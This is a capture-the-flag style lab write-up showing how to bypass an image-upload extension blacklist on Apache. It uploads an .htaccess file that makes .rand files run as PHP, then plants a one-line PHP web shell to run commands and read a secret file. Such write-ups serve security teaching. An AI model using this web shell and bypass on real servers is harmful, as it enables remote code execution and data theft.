# Lab: Web Shell Upload via Extension Blacklist Bypass

---

**Vuln** — The image upload function uses an extension blacklist (blocks `.php`) but doesn't block everything, and the server is Apache — so we can override config with `.htaccess`.

**Goal** — Upload a PHP web shell, read `/home/carlos/secret`, and submit it.

**Creds** — `wiener:peter`

---

### Steps

1. **Login and find the upload panel**
   - ![Upload panel on My Account page]({D72565B5-EE0B-4EC7-AD69-43F04F26F51C}.png)

2. **Try uploading `payload.php`** — server blocks `.php` extension
   - ![PHP files not allowed error]({C764C408-9191-48D8-AA4B-2E0F118AE543}.png)

3. **Try `.png`** — image files are accepted, so only extension is validated (not content)
   - ![PNG upload accepted in Burp]({D3E5BFC0-229C-45D5-9E97-02283A3E9B3B}.png)

4. **Try `.php3`** — file uploads but doesn't execute (server only runs `.php`)
   - ![php3 uploaded but not executed]({ECE114E2-C4F4-42B6-81C8-CB191CBABBAA}.png)

5. **Notice the server is Apache** — response header shows `Apache/2.4.41 (Ubuntu)`, which means `.htaccess` overrides are possible
   - ![Apache server header in Burp response]({441AA5FF-C069-4DB4-918E-A1B8919D5311}.png)

6. **Upload a `.htaccess` file** to tell Apache to execute `.rand` files as PHP
   - ![.htaccess config — AddType application/x-httpd-php .rand]({76C0C496-C8ED-4383-A005-28FE68EAA5B2}.png)
   - `.htaccess` uploaded successfully
   - ![.htaccess upload success]({AA3BF1FA-B165-41E9-A3D8-3EDE4F8CD899}.png)

   ```
   AddType application/x-httpd-php .rand
   ```

7. **Upload `payload.rand`** with PHP code — now Apache treats it as PHP
   - ![payload.rand uploaded]({2E105AC0-F4F3-4F72-B038-E8C9F6D07145}.png)
   - Open the file in browser → RCE confirmed (`whoami` → `carlos`)
   - ![whoami output shows carlos]({83228FC4-4672-4B0F-A946-5C74DC4650CD}.png)
   - Read the secret via `cat /home/carlos/secret`
   - ![Secret key output]({084E879F-CAEB-4947-823B-0D4F1CE1ABC6}.png)

8. **Submit the secret → Lab solved ✅**
   - ![Lab solved]({180F7694-9DA8-42E9-BE9F-BFA3557DE051}.png)

---

### Files Used

| File | Purpose |
|------|---------|
| `.htaccess` | Maps `.rand` extension to PHP handler |
| `payload.rand` | Web shell — `<?php echo shell_exec($_GET['cmd']); ?>` |
| `payload.php` | Original payload (blocked by blacklist) |

```check Poc.py for automate this attack```